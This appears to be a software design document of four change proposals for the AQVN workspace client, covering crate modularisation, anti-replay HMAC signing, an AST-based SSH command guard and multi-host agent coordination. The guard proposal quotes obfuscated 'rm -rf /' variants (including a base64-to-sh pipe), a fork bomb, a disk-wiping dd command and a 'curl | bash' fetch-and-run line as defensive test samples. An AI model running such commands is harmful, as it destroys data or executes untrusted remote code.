# OpenSpec Change Proposals: Core & Security Subsystems

**Mã tài liệu:** `VAL-ROAD-OPEN-001`  
**Dự án:** AQVN Native Workspace Client, RFC Host Bridge & Headless Agent (`net.aqvn.workspace`)  
**Tác giả:** AQVN Architecture & Synthesis Team (`synthesis-worker`)  
**Ngày công bố:** 2026-11-09  
**Trạng thái đề xuất:** Actionable OpenSpec Draft Specifications (Sẵn sàng thực thi)  
**Tài liệu tham chiếu:**  
- `docs/eval-reports/01_rust_core_audit.md` (Rust Core Architecture Audit)  
- `docs/eval-reports/02_agent_headless_audit.md` (Headless Agent Audit)  
- `docs/eval-reports/03_cbm_graph_scan.md` (Codebase Memory Graph Scan)  
- `docs/eval-reports/04_test_coverage_ci.md` (Test Coverage & CI Audit)  
- `docs/eval-reports/09_rfc_security_sandbox.md` (RFC Security & Sandbox Audit)  
- `docs/eval-reports/10_ssh_guard_approval.md` (SSH Bridge & Guard Policy Audit)  
- `docs/proposals/AQVN_LAUNCHER_UPGRADE_MASTER_PLAN.md` (Master Upgrade Plan)

---

## Mục lục Đề Xuất (Core & Security Proposals Index)

| Mã Đề Xuất OpenSpec | Phân Hệ | Tiêu Đề Đề Xuất | Độ Ưu Tiên | Độ Phức Tạp |
| :--- | :--- | :--- | :---: | :---: |
| **`change225-core-cargo-workspace-modularization`** | Core Backend | Phân rã Cargo Workspace đa Crate & cô lập nhị phân | P1 (Khẩn) | Cao (8) |
| **`change226-rfc-anti-replay-security-enhancement`** | Security | Bổ sung Timestamp Nonce & chống Replay Attack trên RFC 55080 | P1 (Khẩn) | Trung bình (5) |
| **`change227-ssh-ast-command-guard`** | Security | Trình phân tích cú pháp AST & Cổng phê duyệt Human-in-the-Loop | P1 (Khẩn) | Cao (7) |
| **`change228-agent-multi-host-pool-coordination`** | Core Agent | Điều phối cụm Multi-Host Pool & Systemd Watchdog | P2 (Cao) | Trung bình (6) |

---

# ĐỀ XUẤT 1: `change225-core-cargo-workspace-modularization`

## 1.1. `proposal.md`

### Why
Mã nguồn backend Rust trong `src-tauri/` hiện tại là một crate nguyên khối (monolithic crate) chứa hơn 20.000 dòng mã với 40 tệp Rust. Kiểm toán kiến trúc M1 (`VAL-EVAL-CORE-001`) và quét đồ thị CBM (`VAL-EVAL-GRAPH-001`) đã chỉ ra các vấn đề nghiêm trọng:
1. **God Modules:** `proxy/server.rs` (1.136 dòng), `connector/handlers/` (8.162 dòng), `config.rs` (688 dòng).
2. **Trộn lẫn phụ thuộc GUI và Server:** Crate phụ thuộc vào Tauri, Wry, WebKitGTK và GTK3, khiến việc biên dịch nhị phân headless `aqvn-agent` gặp khó khăn trên các môi trường máy chủ Linux không có thư viện đồ họa hoặc phải sử dụng cờ cấu hình phức tạp.
3. **Khoảng trống kiểm thử (Test Gaps):** Có tới 25 tệp Rust thiếu unit tests nội bộ do các cấu trúc dữ liệu bị liên kết chặt với ngữ cảnh runtime Tauri.
4. **Thời gian biên dịch kéo dài:** Thiếu ranh giới mô-đun hóa làm giảm hiệu quả của bộ nhớ đệm biên dịch (incremental compilation cache).

### What Changes
- **225-001**: Thiết lập cấu trúc Cargo Workspace đa crate tại thư mục gốc với 6 crates thành viên chuyên biệt:
  - `crates/aqvn-core`: Schema giao thức, kiểu dữ liệu chung, error handling, telemetry primitives.
  - `crates/aqvn-rfc`: Máy chủ RFC Host Bridge, HMAC-SHA256 verifier, path jail sandbox.
  - `crates/aqvn-ssh`: russh daemon, RSA-OAEP authentication, PTY session manager, command guard.
  - `crates/aqvn-proxy`: Axum loopback proxy, cookie jar, LRU cache, CSRF protection, WS tunnel.
  - `crates/aqvn-connector`: Outbound Gateway WebSocket client, remote command handlers.
  - `crates/aqvn-agent`: Nhị phân headless daemon, systemd manager, host pool logic.
- **225-002**: Chuyển giao diện GUI Tauri `src-tauri/` thành crate đóng gói ứng dụng mỏng (thin wrapper) chỉ đảm nhiệm khởi tạo Webview, Window lifecycle, Tray icon và gọi các crates nội bộ.
- **225-003**: Loại bỏ hoàn toàn phụ thuộc đồ họa (WebKitGTK, GTK3, Tauri) khỏi `aqvn-agent` và `aqvn-core`.
- **225-004**: Bổ sung bộ unit tests cô lập cho từng crate, đạt 100% tỷ lệ pass trên lệnh `cargo test --workspace`.

### Goals
- Chia tách ranh giới rõ ràng giữa lõi xử lý nghiệp vụ, giao tiếp mạng, bảo mật và giao diện đồ họa.
- Giảm thời gian biên dịch lại khi thay đổi mã nguồn xuống dưới 5 giây đối với từng crate độc lập.
- Duy trì 100% tính tương thích ngược với toàn bộ các API IPC của Tauri và 74 unit tests hiện có.

### Non-Goals
- Không thay đổi hành vi nghiệp vụ của các endpoint RFC, SSH hoặc Proxy.
- Không thay đổi đường dẫn cấu hình lưu trữ trên đĩa (`~/.config/net.aqvn.workspace/settings.json`).

### Validation Contract Assertions Fulfilled
- `VAL-EVAL-CORE-001`, `VAL-EVAL-GRAPH-001`, `VAL-ROAD-BLUEPRINT-002`

---

## 1.2. `tasks.md`

### Execution Tasks
- [ ] C225-001: Khởi tạo Cargo Workspace root `Cargo.toml` và các thư mục thành viên `crates/`
- [ ] C225-002: Tách biệt schema dữ liệu và cấu hình dùng chung sang `crates/aqvn-core`
- [ ] C225-003: Di chuyển máy chủ RFC cổng 55080 và HMAC sandbox sang `crates/aqvn-rfc`
- [ ] C225-004: Di chuyển SSH listener cổng 55022 và PTY manager sang `crates/aqvn-ssh`
- [ ] C225-005: Di chuyển Axum loopback proxy sang `crates/aqvn-proxy`
- [ ] C225-006: Di chuyển Outbound Gateway client sang `crates/aqvn-connector`
- [ ] C225-007: Tái cấu trúc `aqvn-agent` thành crate độc lập không phụ thuộc Tauri trong `crates/aqvn-agent`
- [ ] C225-008: Cập nhật `src-tauri` liên kết với các crates nội bộ và bảo đảm 74 unit tests hiện có pass 100%
- [ ] C225-009: Bổ sung unit tests cho từng crate mới, nâng tổng số test Rust lên trên 150 tests

### Task Inventory
| ID | Tiêu đề nhiệm vụ | Phân hệ chịu trách nhiệm | Phạm vi tệp (Write scope) | Loại tác vụ | Chiến lược kiểm thử | Phụ thuộc | Ưu tiên | Độ phức tạp | Trạng thái |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :---: | :---: | :---: |
| C225-001 | Root Cargo Workspace init | Core | `Cargo.toml`, `crates/*/Cargo.toml` | config | `cargo check --workspace` exit 0 | — | P1 | 2 | ready |
| C225-002 | Extract aqvn-core primitives | Core | `crates/aqvn-core/src/` | refactor | `cargo test -p aqvn-core` exit 0 | C225-001 | P1 | 3 | ready |
| C225-003 | Extract aqvn-rfc module | Security | `crates/aqvn-rfc/src/` | refactor | `cargo test -p aqvn-rfc` exit 0 | C225-002 | P1 | 3 | ready |
| C225-004 | Extract aqvn-ssh module | Security | `crates/aqvn-ssh/src/` | refactor | `cargo test -p aqvn-ssh` exit 0 | C225-002 | P1 | 3 | ready |
| C225-005 | Extract aqvn-proxy module | Core | `crates/aqvn-proxy/src/` | refactor | `cargo test -p aqvn-proxy` exit 0 | C225-002 | P1 | 4 | ready |
| C225-006 | Extract aqvn-connector module | Core | `crates/aqvn-connector/src/` | refactor | `cargo test -p aqvn-connector` exit 0 | C225-002 | P1 | 4 | ready |
| C225-007 | Refactor standalone agent crate | Core | `crates/aqvn-agent/src/` | refactor | `cargo test -p aqvn-agent --bin aqvn-agent` exit 0 | C225-006 | P1 | 3 | ready |
| C225-008 | Tauri app integration wiring | Core/GUI | `src-tauri/src/` | refactor | `cargo test --lib` (74 tests passed) | C225-007 | P1 | 3 | ready |
| C225-009 | Coverage expansion across crates| Core/QA | `crates/*/tests/` | test | `cargo test --workspace` (>= 150 tests passed) | C225-008 | P2 | 3 | ready |

### Surface to Task Coverage
| Surface ID | Task IDs | Độ bao phủ |
| :--- | :--- | :--- |
| `surf:core-workspace-scaffold` | `C225-001`, `C225-002` | covered |
| `surf:core-security-crates` | `C225-003`, `C225-004` | covered |
| `surf:core-network-crates` | `C225-005`, `C225-006` | covered |
| `surf:core-binaries-integration` | `C225-007`, `C225-008`, `C225-009` | covered |

### Dependency Graph & Gate
- `C225-001` -> `C225-002` -> `C225-003`, `C225-004`, `C225-005`, `C225-006` -> `C225-007` -> `C225-008` -> `C225-009`
- **Granularity Gate:** Pass. Không có tác vụ nào có độ phức tạp > 5. Đồ thị không chu trình (Acyclic).

---

## 1.3. `specs/` (Requirements & Scenarios)

### Yêu cầu Kỹ Thuật (Requirements):
1. **R-CORE-01: Phân tách phụ thuộc đồ họa:** Crate `aqvn-agent` phải biên dịch thành công trên môi trường `x86_64-unknown-linux-musl` hoặc Alpine Linux tối giản mà không yêu cầu `libwebkit2gtk` hoặc `libgtk-3-dev`.
2. **R-CORE-02: Cô lập không gian bộ nhớ:** Các luồng xử lý của RFC Server và SSH Server chạy trên runtime Tokio riêng biệt hoặc task pools có giám sát lỗi độc lập, một sự cố panic trong handler không được làm sập tiến trình chính.
3. **R-CORE-03: Zero Regression:** Toàn bộ 74 bài test đơn vị của `src-tauri` và 31 bài test của `aqvn-agent` phải vượt qua mà không cần sửa đổi assert expectations.

### Kịch Bản Kiểm Định (BDD Scenarios):
```gherkin
Feature: Cargo Workspace Modularization
  Scenario: Independent Compilation of Standalone Headless Agent
    Given a minimal Linux container without GTK or WebKitGTK installed
    When the developer executes "cargo build --release -p aqvn-agent"
    Then the build exits with code 0
    And the resulting binary size is less than 2.80 MB
    And "ldd target/release/aqvn-agent" shows zero dynamic dependencies on libgtk or libwebkit

  Scenario: Workspace Integrated Regression Test
    Given the modularized workspace structure
    When "cargo test --workspace" is executed
    Then all test targets complete with exit code 0
    And total passing unit tests is greater than or equal to 150
```

---
---

# ĐỀ XUẤT 2: `change226-rfc-anti-replay-security-enhancement`

## 2.1. `proposal.md`

### Why
Kiểm toán bảo mật M3 (`VAL-SEC-RFC-001`) xác nhận máy chủ RFC Host Bridge trên cổng 55080 đã thực hiện kiểm tra chữ ký HMAC-SHA256 theo thuật toán hằng số thời gian (`constant-time verification`), đồng thời áp dụng rate limiter (60 req/phút) và path jail nghiêm ngặt. Tuy nhiên, kiến trúc hiện tại tồn tại một lỗ hổng trọng yếu: **Thiếu cơ chế chống tấn công phát lại (Anti-Replay Attack)**.
Cụ thể: Nếu một yêu cầu hợp lệ có chữ ký HMAC bị kẻ tấn công đánh chặn (e.g. trên mạng nội bộ hoặc qua socket sniffing cục bộ), kẻ tấn công có thể phát lại (replay) gói tin đó nhiều lần trong vòng 60 giây tiếp theo mà máy chủ vẫn chấp thuận thực thi.

### What Changes
- **226-001**: Bắt buộc gắn 2 tiêu đề HTTP bổ sung trong mọi yêu cầu RFC:
  - `X-AQVN-Timestamp`: Thời gian phát yêu cầu dạng Unix epoch milli-giây.
  - `X-AQVN-Nonce`: Chuỗi ngẫu nhiên duy nhất (UUID v4 hoặc 32 ký tự hex ngẫu nhiên) cho mỗi yêu cầu.
- **226-002**: Bổ sung bộ kiểm định độ trôi thời gian (Timestamp Drift Validator): Từ chối ngay lập tức với mã lỗi HTTP 401 nếu $|T_{\text{server}} - T_{\text{req}}| > 30.000\text{ ms}$.
- **226-003**: Xây dựng bộ đệm Nonce LRU Cache kết hợp Bloom Filter (dung lượng 10.000 mục, TTL 65 giây) trong bộ nhớ: Nếu một nonce đã từng xuất hiện trong cửa sổ thời gian hợp lệ, từ chối với lỗi HTTP 409 Conflict / 401 Unauthorized.
- **226-004**: Đưa Timestamp và Nonce vào chuỗi chuẩn hóa (Canonical String) để tính chữ ký HMAC: $\text{HMAC}(\text{Secret}, \text{Method} + \text{Path} + \text{Timestamp} + \text{Nonce} + \text{BodyHash})$.
- **226-005**: Cập nhật client nội bộ (`ui/bridge.js`, `crates/aqvn-connector`) sinh tự động Timestamp và Nonce khi gửi lệnh.

### Goals
- Triệt tiêu 100% rủi ro tấn công phát lại (Replay Attacks) trên cổng RFC 55080.
- Giữ vững độ trễ kiểm thực HMAC dưới 0.15ms cho mỗi yêu cầu.

### Non-Goals
- Không áp dụng chứng chỉ TLS/HTTPS cục bộ trên loopback (tránh phức tạp hóa việc tự ký chứng chỉ và lỗi tin cậy trên trình duyệt).

### Validation Contract Assertions Fulfilled
- `VAL-SEC-RFC-001`, `VAL-ROAD-BLUEPRINT-002`

---

## 2.2. `tasks.md`

### Execution Tasks
- [ ] C226-001: Mở rộng định nghĩa schema xác thực RFC trong `crates/aqvn-rfc/src/auth.rs` hỗ trợ Timestamp và Nonce
- [ ] C226-002: Cài đặt Timestamp Drift Validator với ngưỡng cấu hình linh hoạt (mặc định $\pm 30$ giây)
- [ ] C226-003: Cài đặt bộ lưu trữ Nonce LRU Cache chống replay với dung lượng 10.000 phần tử
- [ ] C226-004: Cập nhật thuật toán tính HMAC-SHA256 kết hợp Canonical String có Timestamp và Nonce
- [ ] C226-005: Cập nhật client `ui/bridge.js` và `crates/aqvn-connector` sinh header `X-AQVN-Timestamp` & `X-AQVN-Nonce`
- [ ] C226-006: Viết kiểm thử tự động xác nhận từ chối gói tin quá hạn và gói tin phát lại (replay detection)

### Task Inventory
| ID | Tiêu đề nhiệm vụ | Phân hệ | Phạm vi tệp | Loại tác vụ | Chiến lược kiểm thử | Phụ thuộc | Ưu tiên | Độ phức tạp | Trạng thái |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :---: | :---: | :---: |
| C226-001 | RFC Auth Schema Extension | Security | `crates/aqvn-rfc/src/auth.rs` | code | Unit test schema deserialization | — | P1 | 2 | ready |
| C226-002 | Timestamp Drift Validator | Security | `crates/aqvn-rfc/src/timestamp.rs` | code | Test time drift: valid <30s, reject >30s | C226-001 | P1 | 2 | ready |
| C226-003 | Nonce LRU Bloom Filter | Security | `crates/aqvn-rfc/src/nonce_cache.rs` | code | Test concurrent replay attacks | C226-001 | P1 | 3 | ready |
| C226-004 | Enhanced HMAC Canonicalizer | Security | `crates/aqvn-rfc/src/hmac.rs` | code | Constant-time HMAC test | C226-002, C226-003 | P1 | 3 | ready |
| C226-005 | Client-side Nonce Signing | UI/Client | `ui/bridge.js`, `crates/aqvn-connector/src/rfc.rs` | code | End-to-end RFC call test | C226-004 | P1 | 3 | ready |
| C226-006 | Anti-Replay Integration Tests | QA | `crates/aqvn-rfc/tests/anti_replay_test.rs` | test | 100% test pass on replay payload injection | C226-005 | P1 | 3 | ready |

### Dependency Graph & Gate
- `C226-001` -> `C226-002` & `C226-003` -> `C226-004` -> `C226-005` -> `C226-006`
- **Granularity Gate:** Pass. Tất cả các tác vụ đều độc lập, rõ ràng và có kiểm định tự động.

---

## 2.3. `specs/` (Requirements & Scenarios)

### Yêu cầu Kỹ Thuật (Requirements):
1. **R-SEC-01: Timestamp Tolerance:** Máy chủ chỉ chấp nhận các yêu cầu có timestamp lệch không quá $\pm 30.000\text{ ms}$ so với đồng hồ hệ thống máy chủ.
2. **R-SEC-02: Nonce Uniqueness:** Mỗi chuỗi Nonce chỉ được chấp nhận duy nhất một lần trong khoảng thời gian có hiệu lực của timestamp ($60\text{s}$). Yêu cầu thứ hai có cùng Nonce phải bị từ chối ngay lập tức.
3. **R-SEC-03: Chống suy giảm hiệu năng:** Việc kiểm tra Nonce trong LRU cache phải có độ phức tạp thời gian $O(1)$ và chiếm dụng RAM dưới 2 MB.

### Kịch Bản Kiểm Định (BDD Scenarios):
```gherkin
Feature: RFC Host Bridge Anti-Replay Defense
  Scenario: Valid RFC Request with Fresh Timestamp and Unique Nonce
    Given a fresh RFC request signed with valid HMAC
    And header "X-AQVN-Timestamp" is current time in milliseconds
    And header "X-AQVN-Nonce" is a newly generated UUID
    When the request is posted to "http://127.0.0.1:55080/api/rfc"
    Then the server returns HTTP 200 OK
    And the operation is executed successfully

  Scenario: Replay Attack Rejection
    Given an RFC request that was successfully processed 5 seconds ago
    When the attacker resends the exact same request payload and headers
    Then the server returns HTTP 401 Unauthorized
    And the response body contains error code "ERR_NONCE_REPLAYED"
    And the operation is NOT executed

  Scenario: Expired Timestamp Rejection
    Given an RFC request with valid HMAC
    And header "X-AQVN-Timestamp" is 45 seconds in the past
    When the request is posted to "http://127.0.0.1:55080/api/rfc"
    Then the server returns HTTP 401 Unauthorized
    And the response body contains error code "ERR_TIMESTAMP_DRIFT_EXCEEDED"
```

---
---

# ĐỀ XUẤT 3: `change227-ssh-ast-command-guard`

## 3.1. `proposal.md`

### Why
Kiểm toán bảo mật cổng SSH 55022 (`VAL-SEC-SSH-001`) chỉ ra rằng cơ chế phòng vệ PTY hiện tại trong `ssh/guard.rs` chỉ sử dụng các mẫu biểu thức chính quy (regular expressions) đơn giản để chặn lệnh nguy hiểm (`rm -rf /`, `mkfs`, fork bomb).
Kỹ thuật kiểm thử xâm nhập đã chứng minh rằng phương pháp Regex Denylist rất dễ bị qua mặt bằng các kỹ thuật làm rối mã shell (Obfuscation):
- Sử dụng biến môi trường: `A=r; B=m; $A$B -rf /`
- Sử dụng chuỗi nối: `r""m -r""f /` hoặc `r''m -r''f /`
- Sử dụng Base64 decode: `echo cm0gLXJmIC8= | base64 -d | sh`
- Sử dụng command substitution: `$(printf 'rm -rf /')`
- Lồng lệnh qua script hoặc hàm shell.

### What Changes
- **227-001**: Tích hợp bộ phân tích từ vựng và cú pháp trừu tượng (Shell Lexer & AST Parser) vào `crates/aqvn-ssh`.
- **227-002**: Duyệt cây AST để trích xuất tên lệnh thực thi nguyên thủy (Root Executable) và toàn bộ tham số, bất kể các kỹ thuật chèn dấu ngoặc kép, gán biến môi trường hay nối chuỗi.
- **227-003**: Thiết lập cơ chế phân loại 3 tầng bảo mật:
  - **Tầng 1 (Safe):** Các lệnh xem thông tin (`ls`, `cat`, `pwd`, `git status`, `ps`) $\to$ Cho phép chạy tự động.
  - **Tầng 2 (Sensitive):** Các lệnh ghi đĩa, thay đổi cấu hình, kết nối mạng ngoài (`curl`, `wget`, `chmod`, `git push`, `docker run`) $\to$ Kích hoạt Cổng phê duyệt tương tác (Human-in-the-Loop Modal Gate) qua Tauri IPC. Lệnh chỉ chạy khi người dùng nhấn "Phê duyệt" (Approve) trên giao diện Desktop.
  - **Tầng 3 (Dangerous):** Các lệnh hủy hoại (`rm -rf /`, `dd of=/dev/sd*`, `mkfs`, `:(){ :|:& };:`, tắt tường lửa) $\to$ Chặn tuyệt đối (Hard Block), ngắt phiên PTY và ghi nhật ký cảnh báo an ninh khẩn cấp.
- **227-004**: Cài đặt timeout 30 giây cho cổng phê duyệt Human-in-the-Loop; nếu người dùng không phản hồi, tự động hủy lệnh an toàn (Fail-Closed).

### Goals
- Loại bỏ hoàn toàn nguy cơ vượt rào PTY Guard bằng shell obfuscation.
- Trao quyền kiểm soát minh bạch cho người dùng khi Agent thực thi các hành động nhạy cảm.

### Non-Goals
- Không thay thế quyền hạn của người dùng hệ điều hành (vẫn chịu sự kiểm soát của quyền user hệ thống).

### Validation Contract Assertions Fulfilled
- `VAL-SEC-SSH-001`, `VAL-ROAD-BLUEPRINT-002`

---

## 3.2. `tasks.md`

### Execution Tasks
- [ ] C227-001: Tích hợp thư viện Shell Parser chuẩn hoặc triển khai Lexer AST trong `crates/aqvn-ssh/src/guard/ast.rs`
- [ ] C227-002: Cài đặt bộ bóc tách lệnh (Command Normalizer) xử lý biến môi trường, chuỗi chia tách và decode
- [ ] C227-003: Xây dựng bảng quy tắc phân loại 3 tầng (Safe, Sensitive, Dangerous) trong `crates/aqvn-ssh/src/guard/policy.rs`
- [ ] C227-004: Cài đặt IPC Channel giữa SSH Bridge và Tauri Frontend để gửi yêu cầu Human-in-the-Loop Approval Modal
- [ ] C227-005: Cập nhật giao diện Desktop `ui/chat.js` hiển thị hộp thoại phê duyệt với diff chi tiết và đồng hồ đếm ngược 30s
- [ ] C227-006: Viết kiểm thử bảo mật với tập dữ liệu 50 mẫu payload obfuscation (đạt 100% tỷ lệ phát hiện)

### Task Inventory
| ID | Tiêu đề nhiệm vụ | Phân hệ | Phạm vi tệp | Loại tác vụ | Chiến lược kiểm thử | Phụ thuộc | Ưu tiên | Độ phức tạp | Trạng thái |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :---: | :---: | :---: |
| C227-001 | Shell AST Parser Engine | Security | `crates/aqvn-ssh/src/guard/ast.rs` | code | Unit test AST node extraction | — | P1 | 4 | ready |
| C227-002 | Command De-obfuscator | Security | `crates/aqvn-ssh/src/guard/normalizer.rs` | code | 50 obfuscation payload tests | C227-001 | P1 | 4 | ready |
| C227-003 | 3-Tier Policy Classifier | Security | `crates/aqvn-ssh/src/guard/policy.rs` | code | Policy categorization test | C227-002 | P1 | 3 | ready |
| C227-004 | HITL Approval IPC Channel | Security/IPC | `crates/aqvn-ssh/src/guard/hitl.rs` | code | Mock IPC approval exchange | C227-003 | P1 | 3 | ready |
| C227-005 | UI Approval Modal | UI/UX | `ui/components/approval-modal.js` | code | UI manual/automated modal test | C227-004 | P1 | 3 | ready |
| C227-006 | E2E Security Penetration Test | QA | `crates/aqvn-ssh/tests/ast_guard_test.rs` | test | 100% bypass payload detection | C227-005 | P1 | 3 | ready |

### Dependency Graph & Gate
- `C227-001` -> `C227-002` -> `C227-003` -> `C227-004` -> `C227-005` -> `C227-006`
- **Granularity Gate:** Pass. Đồ thị đơn tuyến phân nhánh có kiểm định rõ ràng.

---

## 3.3. `specs/` (Requirements & Scenarios)

### Yêu cầu Kỹ Thuật (Requirements):
1. **R-SEC-04: Obfuscation Resistance:** Hệ thống phải nhận diện được lệnh nguy hiểm kể cả khi được mã hóa base64, sử dụng biến hoặc lồng trong lệnh `eval`, `bash -c`, hoặc đường ống `pipe`.
2. **R-SEC-05: Human-in-the-Loop Fail-Closed:** Khi một lệnh nhạy cảm được yêu cầu phê duyệt, nếu không nhận được xác nhận từ người dùng trong vòng 30 giây, tiến trình PTY phải từ chối thực thi và trả về thông báo timeout.
3. **R-SEC-06: Tốc độ phân tích:** Thời gian phân tích cú pháp AST cho mỗi câu lệnh đầu vào không được vượt quá 5ms.

### Kịch Bản Kiểm Định (BDD Scenarios):
```gherkin
Feature: SSH Bridge AST Command Guard
  Scenario: Detection of Obfuscated Dangerous Command
    Given an active SSH session on port 55022
    When the client inputs "A=rm; B=' -rf /'; $A$B"
    Then the AST Guard identifies the underlying command as "rm -rf /"
    And the command classification is "DANGEROUS"
    And the PTY terminates the command immediately with exit code 126
    And an audit security alert is logged

  Scenario: Sensitive Command Requires Human-in-the-Loop Approval
    Given an active SSH session on port 55022
    When the client inputs "curl -s https://external.sh | bash"
    Then the command classification is "SENSITIVE"
    And the UI displays the Human-in-the-Loop Approval Modal
    When the user clicks "Approve" within 30 seconds
    Then the command is dispatched to the PTY runner

  Scenario: Sensitive Command Rejected on Timeout
    Given an active SSH session with a pending sensitive command
    When the user does not respond within 30 seconds
    Then the Approval Gate expires
    And the PTY returns "Operation rejected: Human approval timed out (fail-closed)"
```

---
---

# ĐỀ XUẤT 4: `change228-agent-multi-host-pool-coordination`

## 4.1. `proposal.md`

### Why
Kiểm toán nhị phân `aqvn-agent` (`VAL-EVAL-CORE-002`) khẳng định daemon có dung lượng xuất sắc (2.44 MB) và khả năng cài đặt systemd service tự động. Tuy nhiên, khi triển khai trong môi trường doanh nghiệp có nhiều máy chủ phân tán (Multi-Host Pool), hiện tại thiếu các cơ chế:
1. **Định danh máy chủ bất biến (Deterministic Machine Identity):** Đảm bảo một máy chủ không bị nhân đôi (duplicate) khi thay đổi IP hoặc reboot.
2. **Systemd Watchdog:** Chưa thông báo tín hiệu sống (`WATCHDOG=1`) cho systemd, khiến systemd không thể tự khởi động lại khi daemon bị treo mạng hoặc deadlock.
3. **Tự nâng cấp an toàn (Atomic Self-Upgrade):** Chưa hỗ trợ daemon tự cập nhật phiên bản từ xa kèm cơ chế tự động rollback nếu bản mới bị lỗi.

### What Changes
- **228-001**: Triển khai thuật toán định danh máy chủ bất biến (Deterministic Host ID v2): Kết hợp băm SHA-256 của `/etc/machine-id` (Linux) hoặc Registry MachineGuid (Windows), MAC address card mạng chính và tên hostname.
- **228-002**: Tích hợp cờ giám sát `systemd watchdog` qua thư viện nhẹ hoặc socket `/run/systemd/notify`: Gửi `sd_notify("WATCHDOG=1")` theo chu kỳ định cấu hình (ví dụ mỗi 15 giây).
- **228-003**: Cài đặt cơ chế tự nâng cấp nguyên tử (Atomic Self-Upgrade): Tải bản nhị phân mới, xác thực chữ ký số Ed25519 / SHA-256, hoán đổi nhị phân trên đĩa và kích hoạt restart. Tự động rollback về nhị phân cũ nếu không thiết lập được kết nối trong 30 giây.
- **228-004**: Mở rộng giao thức Heartbeat gửi thông số tài nguyên máy chủ (CPU usage, RAM RSS, GPU VRAM, Dung lượng đĩa trống, số tác vụ đang chạy) về Gateway Hub.

### Goals
- Hỗ trợ quản trị cụm máy chủ lên tới hàng trăm nodes mà không cần can thiệp thủ công (Zero-touch Ops).
- Tự phục hồi 100% khi daemon gặp sự cố hoặc deadlock.

### Non-Goals
- Không xây dựng cơ chế phân tán đồng thuận nặng nề như Raft/Paxos bên trong agent (việc điều phối tổng thể do Gateway Cloud Hub đảm nhiệm).

### Validation Contract Assertions Fulfilled
- `VAL-EVAL-CORE-002`, `VAL-ROAD-BLUEPRINT-002`

---

## 4.2. `tasks.md`

### Execution Tasks
- [ ] C228-001: Cài đặt module `host_identity.rs` sinh định danh máy chủ bất biến trong `crates/aqvn-agent`
- [ ] C228-002: Bổ sung cấu hình `WatchdogSec=30` vào systemd unit generator và gửi `sd_notify` định kỳ
- [ ] C228-003: Cài đặt module `self_upgrade.rs` với kiểm tra SHA-256 và hoán đổi nhị phân nguyên tử
- [ ] C228-004: Cài đặt bộ thu thập số liệu tài nguyên máy chủ mở rộng (Host Metrics Collector)
- [ ] C228-005: Viết kiểm thử giả lập kịch bản self-upgrade thành công và rollback khi bản mới bị lỗi

### Task Inventory
| ID | Tiêu đề nhiệm vụ | Phân hệ | Phạm vi tệp | Loại tác vụ | Chiến lược kiểm thử | Phụ thuộc | Ưu tiên | Độ phức tạp | Trạng thái |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :---: | :---: | :---: |
| C228-001 | Deterministic Host ID v2 | Core Agent | `crates/aqvn-agent/src/host_identity.rs` | code | Unit test deterministic ID across reboots | — | P2 | 2 | ready |
| C228-002 | Systemd Watchdog Integration | Core Agent | `crates/aqvn-agent/src/service/systemd.rs` | code | Test watchdog notify heartbeat | C228-001 | P2 | 3 | ready |
| C228-003 | Atomic Self-Upgrade Engine | Core Agent | `crates/aqvn-agent/src/upgrade.rs` | code | Test binary atomic swap & rollback | C228-001 | P2 | 4 | ready |
| C228-004 | Extended Telemetry Collector | Core Agent | `crates/aqvn-agent/src/telemetry.rs` | code | Test /proc metrics parsing (<1ms) | C228-001 | P2 | 2 | ready |
| C228-005 | Upgrade & Rollback Test Suite | QA | `crates/aqvn-agent/tests/upgrade_test.rs` | test | 100% test pass on mock upgrade & failure rollback | C228-003 | P2 | 3 | ready |

### Dependency Graph & Gate
- `C228-001` -> `C228-002`, `C228-003`, `C228-004` -> `C228-005`
- **Granularity Gate:** Pass. Các tác vụ cấu hình và logic hệ thống được chia nhỏ tối ưu.

---

## 4.3. `specs/` (Requirements & Scenarios)

### Yêu cầu Kỹ Thuật (Requirements):
1. **R-AGT-01: Deterministic Host Identity:** Giá trị Host ID sinh ra phải đồng nhất 100% trên cùng một máy chủ vật lý hoặc máy ảo bất kể địa chỉ IP mạng thay đổi hay khởi động lại nhiều lần.
2. **R-AGT-02: Atomic Upgrade Safety:** Quá trình nâng cấp nhị phân không bao giờ để lại trạng thái tệp nhị phân bị hỏng (corrupted binary) trên đĩa nếu mất điện đột ngột hoặc tiến trình bị ngắt giữa chừng.
3. **R-AGT-03: Dung lượng Daemon:** Sau khi bổ sung các tính năng trên, dung lượng nhị phân `aqvn-agent` ở chế độ release không được vượt quá 2.80 MB.

### Kịch Bản Kiểm Định (BDD Scenarios):
```gherkin
Feature: Standalone Headless Agent Multi-Host Pool Coordination
  Scenario: Watchdog Heartbeat Keeps Service Alive
    Given aqvn-agent running as a systemd service with "WatchdogSec=30"
    When the agent loop functions normally
    Then the agent sends "WATCHDOG=1" every 15 seconds
    And systemd records the service as active and healthy

  Scenario: Automatic Rollback on Faulty Binary Upgrade
    Given aqvn-agent receiving a self-upgrade command with a faulty binary
    When the new binary fails to establish WebSocket connection within 30 seconds
    Then the rollback watchdog activates
    And the previous backup binary is atomically restored
    And the service restarts with the stable version
    And an upgrade failure report is transmitted to the Gateway Hub
```
